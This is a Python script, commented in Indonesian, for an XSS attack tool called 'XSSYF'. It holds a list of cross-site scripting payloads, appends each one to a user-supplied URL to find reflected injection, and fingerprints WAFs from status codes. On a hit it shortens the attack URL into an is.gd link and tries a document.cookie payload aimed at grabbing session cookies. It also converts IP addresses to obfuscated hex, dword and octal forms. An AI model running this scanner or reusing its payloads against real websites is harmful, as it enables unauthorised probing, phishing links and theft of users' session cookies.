# Import library yang diperlukan
import urllib.request
from urllib.error import URLError
import urllib.parse
import time
import re
import sys
import colorama
import gdshortener
import requests
import custom
from colorama import Fore, Back, Style

# Kita bisa gunakan (https://xss-game.appspot.com/level1/frame?query=) untuk testing
# Payload untuk Cross Site Scripting
# Payload untuk Cross Site Scripting
xss_attacks = [
    "<script>alert('xss')</script>",
    "<script>alert(\"xss\")</script>",
    "1<ScRiPt>prompt(99961)</ScRiPt>",
    "//1<ScRiPt>prompt(919397)</ScRiPt>",
    "%22%3Cscript%3Ealert%28%27XSSYF%27%29%3C%2Fscript%3E",
    "'\"</scRipt><scRipt>alert('xssyf')</scRipt>",
    "1%253CScrRiPt%2520%253Eprompt%28962477%29%253C%2fsCripT%253E",
    "<scRiPt>alert(1);</scrIPt>",
    "\"><scRipt>alert('xssyf')</scRipt>",
    "'';!--\"<XSS>=&{()}",
    "<q/oncut=alert(1)>",
    "\";alert(1)//",
    "<img src=x onerror=alert('xss')>",
    "<svg/onload=alert('xss')>",
    "<a href=javascript:alert('xss')>Click me</a>",
    "<iframe src='javascript:alert(`xss`)'></iframe>",
    "<body onload=alert('xss')>",
    "<input type='text' value=''><img src='x' onerror='alert(\"xss\")'>",
    "<svg><script>alert('xss')</script></svg>",
    "<img src='x' onerror='prompt(\"xss\")'>",
    "<svg/onload=alert('xss')>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src='x' onerror='confirm(\"xss\")'>",
]


# Fungsi untuk Konfirmasi Vulnerability XSS
def xss2(exploit):
    print("")
    print(Fore.RED + " Testing:", host + exploit)
    try:
        if host != 0:
            source = urllib.request.urlopen(host + exploit).read()
            print(" Source Length Before:", len(host))
            print(" Source Length After:", len(source))

        if re.search("xss", source.lower().decode('utf-8')) is not None:
            print(Fore.RED + "\n [!] XSS:", host + exploit, "\n")
    except urllib.error.HTTPError as e:
        print(Fore.GREEN + "[-] Not Vulnerable (XSS)")
        # Mendeteksi WAF jika Ada
        if e.code == 403:
            print("")
            print(" WAF Terdeteksi => (Mungkin Mod_Security)")
        elif e.code == 999:
            print("")
            print(" WAF Terdeteksi => WebKnight")
        elif e.code == 419:
            print("")
            print(" WAF Terdeteksi => F5 Big IP")
        else:
            print("")
            print(" WAF Tidak Ditemukan")
            print("")
        pass

# Menampilkan Menu dan Contoh dengan ASCII art dan formatting warna
print(Fore.CYAN + "\n")
print(Fore.YELLOW + r"""
   #########################################################################
   #                                                                       #
   #                                                                       #
   #                     X  S  S  Y  F                                     #
   #                                                                       #
   #         xssy (cross site scripting) code by (@RenaldY)                #
   #                                                                       #
   #########################################################################
""")

print("")
print(Fore.MAGENTA + " XSSFY: Penyerang Browser dan Script Alert ")
print("")

# Input Pengguna untuk Vulnerable Link
host = input(" Masukkan Tautan yang Rentan: ")
res1 = urllib.request.urlopen(host)
html = res1.read().decode('utf-8')

print(str(30) + '-')
print(" XSSFY - M E N U")
print(str(30) + '-')
print(" 1. Konfirmasi Vulnerability XSS")
print(" 2. Konverter IP")
print("")

# Pilihan Input Pengguna
choice = input("Masukkan Pilihan Anda [1]: ")
print("")
print(res1.info())
myfile = res1.read()
print("")

# Fungsi untuk Konversi Alamat IP
def ipconvert():
    import binascii
    import socket, struct
    ip = input("Masukkan IP: ")
    print("")
    nn = struct.unpack("!I", socket.inet_aton(ip))[0]
    cc = binascii.hexlify(socket.inet_aton(ip)).decode('utf-8')
    dd = binascii.hexlify(socket.inet_aton(ip)).upper().decode('utf8')
    ip = ip.split('.')
    ff = '.'.join(('0x' + hex(int(i))[2:] for i in ip))
    ss = '%04o.%04o.%04o.%04o' % tuple(map(int, ip))

    print("########## Alamat yang Telah Dikonversi #########")
    print("")
    print(Fore.GREEN + " (Hex Lower) " + cc)
    print("")
    print(Fore.GREEN + " (Hex Upper) " + dd)
    print("")
    print(Fore.GREEN + " (Hex Addr) " + ff)
    print("")
    print(Fore.RED + " (Dword Addr) ", nn)
    print("")
    print(Fore.BLUE + " (Octal Addr) ", ss)
    sys.exit()

# Fungsi untuk Konfirmasi XSS
def XSSConfirm():
    settimes = input("Atur Timeout: ")
    print(" Memindai Host: ", host)
    print("")
    print(Fore.RED + "[+] Dimuat:", len(xss_attacks), "payload\n")
    try:
        for exploit in xss_attacks:
            time.sleep(int(settimes))
            xss2(exploit.replace("\n", ""))

            # Konfirmasi dengan Mencari Payload dalam Kode Halaman Web
            heer = custom.Check()
            bb = " [+] Payload Tertanam Ditemukan dalam Kode Halaman Web"
            cc = " [-] False Positive"
            try:
                mam = urllib.request.urlopen(host + exploit).read()
                found = False
                for payload in heer.hit:
                    if payload in mam.decode('utf-8'):
                        found = True
                if found:
                    print("")
                    print(Fore.YELLOW + bb)
                    s = gdshortener.ISGDShortener()
                    short = s.shorten(host + exploit)[0]
                    print("")
                    print(Fore.GREEN + " Pemendek URL adalah", short)
                    print("")

                    # Mendapatkan COOKIES
                    import http.cookiejar as cookieLib
                    cj = cookieLib.CookieJar()
                    xss_cookie = "%3cscript%3ealert(document.cookie)%3c/script%3e"
                    url1 = (host + xss_cookie)
                    req = urllib.request.Request(url1, headers={"User-Agent": "Mozila/5.0"})
                    f = urllib.request.urlopen(req)
                    html = f.read()
                    print(" Jalankan Document.Cookie")
                    time.sleep(3)
                    print("")
                    for cookie in cj:
                        print(Fore.CYAN + " ==>", cookie)
                else:
                    print("")
                    print(Fore.GREEN + cc)
            except urllib.error.HTTPError as e:
                print(Fore.GREEN + "[-] Tidak Rentan (XSS) ", e)
    except KeyboardInterrupt:
        print("")

# Penanganan Pilihan Pengguna
if '2' in choice:
    print(ipconvert())
elif '1' in choice:
    print(XSSConfirm())
else:
    print("Pilih Jawaban yang Tepat")

print("")
print("")
codehtml = input(" Simpan Kode Halaman:? ")
sas = host
if 'y' in codehtml:
    urllib.request.urlretrieve(sas, "./scan_js.txt")
else:
    pass

print("")
codehtml = input(" Tampilkan Kode HTML:? ")
if 'y' in codehtml:
    data = urllib.request.urlopen(host)
    print(data.info())
    myfile = data.read().decode('utf-8')
    print("")
    print(Fore.WHITE + myfile)
else:
    print("")
    print(Fore.CYAN + " Selamat Berburu")
